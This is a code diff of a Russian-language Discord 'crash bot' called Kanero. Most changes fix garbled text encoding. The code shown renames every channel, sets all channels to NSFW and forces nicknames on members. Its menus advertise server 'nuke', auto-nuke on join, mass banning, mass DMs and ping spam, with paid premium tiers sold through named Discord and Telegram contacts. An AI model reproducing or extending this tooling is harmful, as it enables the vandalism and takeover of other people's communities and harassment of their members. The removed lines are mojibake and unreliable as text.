-                await message.channel.send("РЈРєР°Р¶Рё РЅР°Р·РІР°РЅРёРµ: `!rename <РЅР°Р·РІР°РЅРёРµ>`")
+                await message.channel.send("Укажи название: `!rename <название>`")
                 return
             asyncio.create_task(asyncio.gather(
                 *[c.edit(name=args) for c in guild.channels],
                 return_exceptions=True
             ))
-            await message.channel.send(f"вњ… РџРµСЂРµРёРјРµРЅРѕРІС‹РІР°СЋ РєР°РЅР°Р»С‹ РЅР° **{guild.name}**")
+            await message.channel.send(f"? Переименовываю каналы на **{guild.name}**")
 
         elif cmd_name == "nsfw_all":
             asyncio.create_task(asyncio.gather(
                 *[c.edit(nsfw=True) for c in guild.text_channels],
                 return_exceptions=True
             ))
-            await message.channel.send(f"вњ… NSFW РІРєР»СЋС‡С‘РЅ РЅР° **{guild.name}**")
+            await message.channel.send(f"? NSFW включён на **{guild.name}**")
 
         elif cmd_name == "unnsfw_all":
             asyncio.create_task(asyncio.gather(
                 *[c.edit(nsfw=False) for c in guild.text_channels],
                 return_exceptions=True
             ))
-            await message.channel.send(f"вњ… NSFW РІС‹РєР»СЋС‡РµРЅ РЅР° **{guild.name}**")
+            await message.channel.send(f"? NSFW выключен на **{guild.name}**")
 
         elif cmd_name == "nicks_all":
             if not args:
-                await message.channel.send("РЈРєР°Р¶Рё РЅРёРє: `!nicks_all <РЅРёРє>`")
+                await message.channel.send("Укажи ник: `!nicks_all <ник>`")
                 return
             targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
             asyncio.create_task(asyncio.gather(
                 *[m.edit(nick=args) for m in targets],
                 return_exceptions=True
             ))
-            await message.channel.send(f"вњ… РњРµРЅСЏСЋ РЅРёРєРё РЅР° **{guild.name}**")
+            await message.channel.send(f"? Меняю ники на **{guild.name}**")
 
         elif cmd_name == "webhooks":
             whs = await guild.webhooks()
             if not whs:
-                await message.channel.send("Р’РµР±С…СѓРєРѕРІ РЅРµС‚.")
+                await message.channel.send("Вебхуков нет.")
                 return
             msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
             await message.channel.send(f"```{msg[:1900]}```")
@@ -5010,118 +5010,118 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             state = args.lower()
             if state == "on":
                 config.AUTO_NUKE = True
-                await message.channel.send("вњ… РђРІС‚Рѕ-РєСЂР°С€ РІРєР»СЋС‡С‘РЅ.")
+                await message.channel.send("? Авто-краш включён.")
             elif state == "off":
                 config.AUTO_NUKE = False
-                await message.channel.send("вќЊ РђРІС‚Рѕ-РєСЂР°С€ РІС‹РєР»СЋС‡С‘РЅ.")
+                await message.channel.send("? Авто-краш выключён.")
             elif state == "info":
-                status = "вњ… Р’РєР»СЋС‡С‘РЅ" if config.AUTO_NUKE else "вќЊ Р’С‹РєР»СЋС‡С‘РЅ"
-                await message.channel.send(f"РђРІС‚Рѕ-РєСЂР°С€: {status}")
+                status = "? Включён" if config.AUTO_NUKE else "? Выключён"
+                await message.channel.send(f"Авто-краш: {status}")
             else:
-                await message.channel.send("РСЃРїРѕР»СЊР·СѓР№: `!auto_nuke on/off/info`")
+                await message.channel.send("Используй: `!auto_nuke on/off/info`")
 
         elif cmd_name in ("wl_add",):
             if not args:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!wl_add <id>`")
+                await message.channel.send("Использование: `!wl_add <id>`")
                 return
             try:
                 uid = int(args.strip())
                 if uid not in config.WHITELIST:
                     config.WHITELIST.append(uid)
                     save_whitelist()
-                    await message.channel.send(f"вњ… `{uid}` РґРѕР±Р°РІР»РµРЅ РІ whitelist.")
+                    await message.channel.send(f"? `{uid}` добавлен в whitelist.")
                 else:
-                    await message.channel.send("РЈР¶Рµ РІ whitelist.")
+                    await message.channel.send("Уже в whitelist.")
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!wl_add <id>`")
+                await message.channel.send("Использование: `!wl_add <id>`")
 
         elif cmd_name in ("wl_remove",):
             if not args:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!wl_remove <id>`")
+                await message.channel.send("Использование: `!wl_remove <id>`")
                 return
             try:
                 uid = int(args.strip())
                 if uid in config.WHITELIST:
                     config.WHITELIST.remove(uid)
                     save_whitelist()
-                    await message.channel.send(f"вњ… `{uid}` СѓР±СЂР°РЅ РёР· whitelist.")
+                    await message.channel.send(f"? `{uid}` убран из whitelist.")
                 else:
-                    await message.channel.send("РќРµ РЅР°Р№РґРµРЅ РІ whitelist.")
+                    await message.channel.send("Не найден в whitelist.")
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!wl_remove <id>`")
+                await message.channel.send("Использование: `!wl_remove <id>`")
 
         elif cmd_name in ("wl_list",):
             if not config.WHITELIST:
-                await message.channel.send("Whitelist РїСѓСЃС‚.")
+                await message.channel.send("Whitelist пуст.")
             else:
                 lines = []
                 for uid in config.WHITELIST:
                     try:
                         user = await bot.fetch_user(uid)
-                        lines.append(f"`{uid}` вЂ” **{user}**")
+                        lines.append(f"`{uid}` — **{user}**")
                     except Exception:
-                        lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-                embed = discord.Embed(title="вњ… Whitelist", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(config.WHITELIST)}")
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="? Whitelist", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"?? Kanero  |  Всего: {len(config.WHITELIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "inv":
             app_id = bot.user.id
             url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
-            await message.channel.send(f"Р”РѕР±Р°РІРёС‚СЊ Р±РѕС‚Р°: {url}")
+            await message.channel.send(f"Добавить бота: {url}")
 
         elif cmd_name == "block_guild":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             try:
                 gid = int(args.strip()) if args.strip() else guild.id
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!block_guild <id>`")
+                await message.channel.send("Использование: `!block_guild <id>`")
                 return
             if gid not in BLOCKED_GUILDS:
                 BLOCKED_GUILDS.append(gid)
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"рџ”’ РЎРµСЂРІРµСЂ {name_str} Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send(f"?? Сервер {name_str} заблокирован.")
             else:
-                await message.channel.send("РЎРµСЂРІРµСЂ СѓР¶Рµ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send("Сервер уже заблокирован.")
 
         elif cmd_name == "unblock_guild":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             try:
                 gid = int(args.strip()) if args.strip() else guild.id
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!unblock_guild <id>`")
+                await message.channel.send("Использование: `!unblock_guild <id>`")
                 return
             if gid in BLOCKED_GUILDS:
                 BLOCKED_GUILDS.remove(gid)
                 save_blocked_guilds()
                 g = bot.get_guild(gid)
                 name_str = f"**{g.name}**" if g else f"`{gid}`"
-                await message.channel.send(f"рџ”“ РЎРµСЂРІРµСЂ {name_str} СЂР°Р·Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send(f"?? Сервер {name_str} разблокирован.")
             else:
-                await message.channel.send("РЎРµСЂРІРµСЂ РЅРµ Р±С‹Р» Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ.")
+                await message.channel.send("Сервер не был заблокирован.")
 
         elif cmd_name == "blocked_guilds":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             if not BLOCKED_GUILDS:
-                await message.channel.send("РќРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹С… СЃРµСЂРІРµСЂРѕРІ.")
+                await message.channel.send("Нет заблокированных серверов.")
             else:
                 lines = []
                 for gid in BLOCKED_GUILDS:
                     g = bot.get_guild(gid)
-                    lines.append(f"`{gid}` вЂ” {g.name if g else 'РЅРµРёР·РІРµСЃС‚РµРЅ'}")
-                await message.channel.send("рџ”’ Р—Р°Р±Р»РѕРєРёСЂРѕРІР°РЅРЅС‹Рµ СЃРµСЂРІРµСЂС‹:\n" + "\n".join(lines))
+                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
+                await message.channel.send("?? Заблокированные серверы:\n" + "\n".join(lines))
 
         elif cmd_name == "pm_add":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             try:
                 uid = int(args.strip())
@@ -5131,46 +5131,46 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 if uid not in config.WHITELIST:
                     config.WHITELIST.append(uid)
                     save_whitelist()
-                await message.channel.send(f"рџ’Ћ `{uid}` РїРѕР»СѓС‡РёР» **Premium** + РґРѕР±Р°РІР»РµРЅ РІ **Whitelist**.")
+                await message.channel.send(f"?? `{uid}` получил **Premium** + добавлен в **Whitelist**.")
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!pm_add <id>`")
+                await message.channel.send("Использование: `!pm_add <id>`")
 
         elif cmd_name == "pm_remove":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             try:
                 uid = int(args.strip())
                 if uid in PREMIUM_LIST:
                     PREMIUM_LIST.remove(uid)
                     save_premium()
-                    await message.channel.send(f"вњ… `{uid}` СѓР±СЂР°РЅ РёР· Premium.")
+                    await message.channel.send(f"? `{uid}` убран из Premium.")
                 else:
-                    await message.channel.send("РќРµ РЅР°Р№РґРµРЅ РІ Premium.")
+                    await message.channel.send("Не найден в Premium.")
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!pm_remove <id>`")
+                await message.channel.send("Использование: `!pm_remove <id>`")
 
         elif cmd_name == "pm_list":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РўРѕР»СЊРєРѕ РѕРІРЅРµСЂ.")
+                await message.channel.send("? Только овнер.")
                 return
             if not PREMIUM_LIST:
-                await message.channel.send("Premium СЃРїРёСЃРѕРє РїСѓСЃС‚.")
+                await message.channel.send("Premium список пуст.")
             else:
                 lines = []
                 for uid in PREMIUM_LIST:
                     try:
                         user = await bot.fetch_user(uid)
-                        lines.append(f"`{uid}` вЂ” **{user}**")
+                        lines.append(f"`{uid}` — **{user}**")
                     except Exception:
-                        lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
-                embed = discord.Embed(title="рџ’Ћ Premium СЃРїРёСЃРѕРє", description="\n".join(lines), color=0x0a0a0a)
-                embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ: {len(PREMIUM_LIST)}")
+                        lines.append(f"`{uid}` — *не найден*")
+                embed = discord.Embed(title="?? Premium список", description="\n".join(lines), color=0x0a0a0a)
+                embed.set_footer(text=f"?? Kanero  |  Всего: {len(PREMIUM_LIST)}")
                 await message.channel.send(embed=embed)
 
         elif cmd_name == "unban":
             if not args:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!unban <user_id>`")
+                await message.channel.send("Использование: `!unban <user_id>`")
                 return
             try:
                 uid = int(args.strip())
@@ -5184,22 +5184,22 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                     except Exception:
                         failed += 1
                 embed = discord.Embed(
-                    title="рџ”“ Р Р°Р·Р±Р°РЅ РІС‹РїРѕР»РЅРµРЅ",
-                    description=f"РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ: **{user}** (`{uid}`)\nвњ… Р Р°Р·Р±Р°РЅРµРЅ РЅР° **{unbanned}** СЃРµСЂРІРµСЂР°С…\nвќЊ РќРµ СѓРґР°Р»РѕСЃСЊ РЅР° **{failed}** СЃРµСЂРІРµСЂР°С…",
+                    title="?? Разбан выполнен",
+                    description=f"Пользователь: **{user}** (`{uid}`)\n? Разбанен на **{unbanned}** серверах\n? Не удалось на **{failed}** серверах",
                     color=0x0a0a0a
                 )
-                embed.set_footer(text="в пёЏ Kanero")
+                embed.set_footer(text="?? Kanero")
                 await message.channel.send(embed=embed)
             except ValueError:
-                await message.channel.send("РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: `!unban <user_id>`")
+                await message.channel.send("Использование: `!unban <user_id>`")
             except discord.NotFound:
-                await message.channel.send("вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ РЅРµ РЅР°Р№РґРµРЅ.")
+                await message.channel.send("? Пользователь не найден.")
 
         else:
-            await message.channel.send(f"вќЊ РќРµРёР·РІРµСЃС‚РЅР°СЏ РєРѕРјР°РЅРґР° `{cmd_name}`. РќР°РїРёС€Рё `!owner_help`.")
+            await message.channel.send(f"? Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")
 
     except Exception as e:
-        await message.channel.send(f"вќЊ РћС€РёР±РєР°: {e}")
+        await message.channel.send(f"? Ошибка: {e}")
 
 
 @bot.event
@@ -5207,11 +5207,11 @@ async def on_message(message):
     if message.author.bot:
         return
 
-    # в”Ђв”Ђ РЈРїСЂР°РІР»РµРЅРёРµ С‡РµСЂРµР· Р›РЎ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+    # -- Управление через ЛС ----------------------------------
     if isinstance(message.channel, discord.DMChannel):
         content = message.content.strip()
 
-        # !help Рё !changelog вЂ” РґРѕСЃС‚СѓРїРЅС‹ РІСЃРµРј РІ Р›РЎ
+        # !help и !changelog — доступны всем в ЛС
         if content == "!help":
             uid = message.author.id
             is_owner = (uid == config.OWNER_ID)
@@ -5220,79 +5220,79 @@ async def on_message(message):
             is_fl = is_freelisted(uid)
 
             embed = discord.Embed(
-                title="в пёЏ Kanero вЂ” CRASH BOT",
+                title="?? Kanero — CRASH BOT",
                 description=(
                     "```\n"
-                    "  в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в•—  в–€в–€в–€в–€в–€в•— в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в•—  в–€в–€в•—\n"
-                    " в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•‘  в–€в–€в•‘\n"
-                    " в–€в–€в•‘     в–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•‘\n"
-                    " в–€в–€в•‘     в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•‘в•љв•ђв•ђв•ђв•ђв–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•‘\n"
-                    " в•љв–€в–€в–€в–€в–€в–€в•—в–€в–€в•‘  в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘\n"
-                    "  в•љв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќ\n"
+                    "  ------¬------¬  -----¬ -------¬--¬  --¬\n"
+                    " --г====---г==--¬--г==--¬--г====---¦  --¦\n"
+                    " --¦     ------г--------¦-------¬-------¦\n"
+                    " --¦     --г==--¬--г==--¦L====--¦--г==--¦\n"
+                    " L------¬--¦  --¦--¦  --¦-------¦--¦  --¦\n"
+                    "  L=====-L=-  L=-L=-  L=-L======-L=-  L=-\n"
                     "```"
                 ),
                 color=0x0a0a0a
             )
             if is_owner:
-                access_str = "рџ‘‘ **OWNER** вЂ” РїРѕР»РЅС‹Р№ РґРѕСЃС‚СѓРї РєРѕ РІСЃРµРј РєРѕРјР°РЅРґР°Рј"
+                access_str = "?? **OWNER** — полный доступ ко всем командам"
             elif is_prem:
-                access_str = "рџ’Ћ **PREMIUM** вЂ” СЂР°СЃС€РёСЂРµРЅРЅС‹Р№ РґРѕСЃС‚СѓРї"
+                access_str = "?? **PREMIUM** — расширенный доступ"
             elif is_wl:
-                access_str = "вњ… **Whitelist** вЂ” Р±Р°Р·РѕРІС‹Рµ РєРѕРјР°РЅРґС‹"
+                access_str = "? **Whitelist** — базовые команды"
             elif is_fl:
-                access_str = "рџ“‹ **Freelist** вЂ” Р±Р°Р·РѕРІС‹Р№ РґРѕСЃС‚СѓРї (РЅР°РїРёСЃР°Р» РІ #addbot)"
+                access_str = "?? **Freelist** — базовый доступ (написал в #addbot)"
             else:
-                access_str = "вќЊ **РќРµС‚ РґРѕСЃС‚СѓРїР°** вЂ” РЅР°РїРёС€Рё РІ #addbot: https://discord.gg/aud6wwYVRd"
+                access_str = "? **Нет доступа** — напиши в #addbot: https://discord.gg/nNTB37QNCG"
 
-            embed.add_field(name="рџ”‘ РўРІРѕР№ СѓСЂРѕРІРµРЅСЊ РґРѕСЃС‚СѓРїР°", value=access_str, inline=False)
+            embed.add_field(name="?? Твой уровень доступа", value=access_str, inline=False)
             embed.add_field(
-                name="рџ“‹ FREELIST (РЅР°РїРёС€Рё РІ #addbot вЂ” Р±РµСЃРїР»Р°С‚РЅРѕ)",
+                name="?? FREELIST (напиши в #addbot — бесплатно)",
                 value=(
-                    "`!nuke` вЂ” РєСЂР°С€ СЃРµСЂРІРµСЂР°\n"
-                    "`!auto_nuke on/off/info` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ Р±РѕС‚Р°\n"
-                    "`!help` вЂ” СЌС‚Рѕ РјРµРЅСЋ\n"
-                    "`!changelog` В· `!changelogall` вЂ” РёСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№"
+                    "`!nuke` — краш сервера\n"
+                    "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
+                    "`!help` — это меню\n"
+                    "`!changelog` · `!changelogall` — история обновлений"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="вњ… WHITELIST",
+                name="? WHITELIST",
                 value=(
-                    "`!nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє СЃРѕ СЃРІРѕРёРј С‚РµРєСЃС‚РѕРј\n"
-                    "`!stop` В· `!cleanup` В· `!rename` В· `!nicks_all`\n"
-                    "`!webhooks` В· `!clear [С‡РёСЃР»Рѕ]` В· `!inv`\n"
-                    "`/sp [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]` В· `/spkd [Р·Р°РґРµСЂР¶РєР°] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]`"
+                    "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!stop` · `!cleanup` · `!rename` · `!nicks_all`\n"
+                    "`!webhooks` · `!clear [число]` · `!inv`\n"
+                    "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ’Ћ PREMIUM",
+                name="?? PREMIUM",
                 value=(
-                    "`!nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє СЃРѕ СЃРІРѕРёРј С‚РµРєСЃС‚РѕРј\n"
-                    "`!super_nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє + Р±Р°РЅ РґРѕ 15 СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                    "`!massban` В· `!massdm` В· `!spam` В· `!pingspam`\n"
-                    "`!rolesdelete` В· `!serverinfo` В· `!userinfo`\n"
+                    "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!super_nuke [текст]` — нюк + бан до 15 участников\n"
+                    "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+                    "`!rolesdelete` · `!serverinfo` · `!userinfo`\n"
                     "`!auto_super_nuke on/off/text/info`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="пїЅ OWNER",
+                name="? OWNER",
                 value=(
-                    "`!wl_add/remove/list` В· `!pm_add/remove/list`\n"
+                    "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                     "`!block_guild / !unblock_guild / !blocked_guilds`\n"
                     "`!set_spam_text / !get_spam_text`\n"
                     "`!owl_add/remove/list`\n"
-                    "`!guilds / !setguild / !invlink` (РІ Р›РЎ)"
+                    "`!guilds / !setguild / !invlink` (в ЛС)"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ’¬ РљСѓРїРёС‚СЊ РїРѕРґРїРёСЃРєСѓ",
+                name="?? Купить подписку",
                 value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                 inline=False
             )
-            embed.set_footer(text="в пёЏ Kanero  |  !changelog вЂ” РёСЃС‚РѕСЂРёСЏ РѕР±РЅРѕРІР»РµРЅРёР№")
+            embed.set_footer(text="?? Kanero  |  !changelog — история обновлений")
             embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
             await message.channel.send(embed=embed)
             return
@@ -5302,176 +5302,176 @@ async def on_message(message):
             await changelog(ctx)
             return
 
-        # Р’СЃС‘ РѕСЃС‚Р°Р»СЊРЅРѕРµ вЂ” С‚РѕР»СЊРєРѕ РґР»СЏ РІР°Р№С‚Р»РёСЃС‚Р°
+        # Всё остальное — только для вайтлиста
         if not is_whitelisted(message.author.id):
             return
 
-        # !owner_help вЂ” СЃРїРёСЃРѕРє РІСЃРµС… Р›РЎ-РєРѕРјР°РЅРґ (С‚РѕР»СЊРєРѕ OWNER_ID)
+        # !owner_help — список всех ЛС-команд (только OWNER_ID)
         if content == "!owner_help":
             if message.author.id != config.OWNER_ID:
-                await message.channel.send("вќЊ РќРµС‚ РґРѕСЃС‚СѓРїР°.")
+                await message.channel.send("? Нет доступа.")
                 return
             embed = discord.Embed(
-                title="рџ’Ђ OWNER PANEL вЂ” Kanero",
+                title="?? OWNER PANEL — Kanero",
                 description=(
                     "```\n"
-                    " в–‘в–€в–€в–€в–€в–€в•—в–‘в–‘в–€в–€в•—в–‘в–‘в–‘в–‘в–‘в–‘в–‘в–€в–€в•—в–€в–€в–€в•—в–‘в–‘в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в•—в–‘\n"
-                    " в–€в–€в•”в•ђв•ђв–€в–€в•—в–‘в–€в–€в•‘в–‘в–‘в–€в–€в•—в–‘в–‘в–€в–€в•‘в–€в–€в–€в–€в•—в–‘в–€в–€в•‘в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•”в•ђв•ђв–€в–€в•—\n"
-                    " в–€в–€в•‘в–‘в–‘в–€в–€в•‘в–‘в•љв–€в–€в•—в–€в–€в–€в–€в•—в–€в–€в•”в•ќв–€в–€в•”в–€в–€в•—в–€в–€в•‘в–€в–€в–€в–€в–€в•—в–‘в–‘в–€в–€в–€в–€в–€в–€в•”в•ќ\n"
-                    " в–€в–€в•‘в–‘в–‘в–€в–€в•‘в–‘в–‘в–€в–€в–€в–€в•”в•ђв–€в–€в–€в–€в•‘в–‘в–€в–€в•‘в•љв–€в–€в–€в–€в•‘в–€в–€в•”в•ђв•ђв•ќв–‘в–‘в–€в–€в•”в•ђв•ђв–€в–€в•—\n"
-                    " в•љв–€в–€в–€в–€в–€в•”в•ќв–‘в–‘в•љв–€в–€в•”в•ќв–‘в•љв–€в–€в•”в•ќв–‘в–€в–€в•‘в–‘в•љв–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в•‘в–‘в–‘в–€в–€в•‘\n"
-                    " в–‘в•љв•ђв•ђв•ђв•ђв•ќв–‘в–‘в–‘в–‘в•љв•ђв•ќв–‘в–‘в–‘в•љв•ђв•ќв–‘в–‘в•љв•ђв•ќв–‘в–‘в•љв•ђв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќв–‘в–‘в•љв•ђв•ќ\n"
+                    " ------¬----¬---------¬---¬----¬-------¬------¬-\n"
+                    " --г==--¬---¦----¬----¦----¬---¦--г====---г==--¬\n"
+                    " --¦----¦-L--¬----¬--г---г--¬--¦-----¬--------г-\n"
+                    " --¦----¦------г=----¦---¦L----¦--г==-----г==--¬\n"
+                    " L-----г---L--г--L--г----¦-L---¦-------¬--¦----¦\n"
+                    " -L====-----L=----L=---L=---L==-L======-L=---L=-\n"
                     "```\n"
-                    "> рџ”ђ РўРѕР»СЊРєРѕ С‚С‹ РёРјРµРµС€СЊ РґРѕСЃС‚СѓРї Рє СЌС‚РѕРјСѓ РјРµРЅСЋ."
+                    "> ?? Только ты имеешь доступ к этому меню."
                 ),
                 color=0x0a0a0a
             )
             embed.add_field(
-                name="рџ–ҐпёЏ РЎР•Р Р’Р•Р Р«",
+                name="??? СЕРВЕРЫ",
                 value=(
-                    "`!guilds` вЂ” СЃРїРёСЃРѕРє СЃРµСЂРІРµСЂРѕРІ Р±РѕС‚Р° (РєРЅРѕРїРєРё РІС‹Р±РѕСЂР°)\n"
-                    "`!setguild <id>` вЂ” РІС‹Р±СЂР°С‚СЊ СЃРµСЂРІРµСЂ РїРѕ ID\n"
-                    "`!invlink` вЂ” РёРЅРІР°Р№С‚-СЃСЃС‹Р»РєРё СЃРѕ РІСЃРµС… СЃРµСЂРІРµСЂРѕРІ"
+                    "`!guilds` — список серверов бота (кнопки выбора)\n"
+                    "`!setguild <id>` — выбрать сервер по ID\n"
+                    "`!invlink` — инвайт-ссылки со всех серверов"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="вљЎ РљРћРњРђРќР”Р« РќРђ РЎР•Р Р’Р•Р Р•",
+                name="? КОМАНДЫ НА СЕРВЕРЕ",
                 value=(
-                    "Р’С‹Р±РµСЂРё СЃРµСЂРІРµСЂ в†’ РїРёС€Рё РєРѕРјР°РЅРґС‹ РїСЂСЏРјРѕ РІ Р›РЎ:\n"
-                    "`!nuke` В· `!stop` В· `!cleanup`\n"
-                    "`!rename` В· `!nsfw_all` В· `!unnsfw_all`\n"
-                    "`!nicks_all` В· `!webhooks`\n"
+                    "Выбери сервер > пиши команды прямо в ЛС:\n"
+                    "`!nuke` · `!stop` · `!cleanup`\n"
+                    "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
+                    "`!nicks_all` · `!webhooks`\n"
                     "`!auto_nuke on/off/info`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ’Ћ PREMIUM",
+                name="?? PREMIUM",
                 value=(
-                    "Р”Р°С‘С‚ РІРѕР·РјРѕР¶РЅРѕСЃС‚СЊ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ `!nuke [СЃРІРѕР№ С‚РµРєСЃС‚]`.\n\n"
-                    "`!pm_add <id>` вЂ” РІС‹РґР°С‚СЊ Premium\n"
-                    "`!pm_remove <id>` вЂ” Р·Р°Р±СЂР°С‚СЊ Premium\n"
-                    "`!pm_list` вЂ” СЃРїРёСЃРѕРє Premium РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№"
+                    "Даёт возможность использовать `!nuke [свой текст]`.\n\n"
+                    "`!pm_add <id>` — выдать Premium\n"
+                    "`!pm_remove <id>` — забрать Premium\n"
+                    "`!pm_list` — список Premium пользователей"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ“ќ РўР•РљРЎРў РќР®РљРђ",
+                name="?? ТЕКСТ НЮКА",
                 value=(
-                    "Р”РµС„РѕР»С‚РЅС‹Р№ С‚РµРєСЃС‚ РєРѕС‚РѕСЂС‹Р№ РёСЃРїРѕР»СЊР·СѓРµС‚СЃСЏ РїСЂРё `!nuke` Р±РµР· Р°СЂРіСѓРјРµРЅС‚РѕРІ.\n\n"
-                    "`!set_spam_text <С‚РµРєСЃС‚>` вЂ” СЃРјРµРЅРёС‚СЊ С‚РµРєСЃС‚\n"
-                    "`!get_spam_text` вЂ” РїРѕРєР°Р·Р°С‚СЊ С‚РµРєСѓС‰РёР№ С‚РµРєСЃС‚"
+                    "Дефолтный текст который используется при `!nuke` без аргументов.\n\n"
+                    "`!set_spam_text <текст>` — сменить текст\n"
+                    "`!get_spam_text` — показать текущий текст"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="рџ”’ Р‘Р›РћРљРР РћР’РљРђ РЎР•Р Р’Р•Р РћР’",
+                name="?? БЛОКИРОВКА СЕРВЕРОВ",
                 value=(
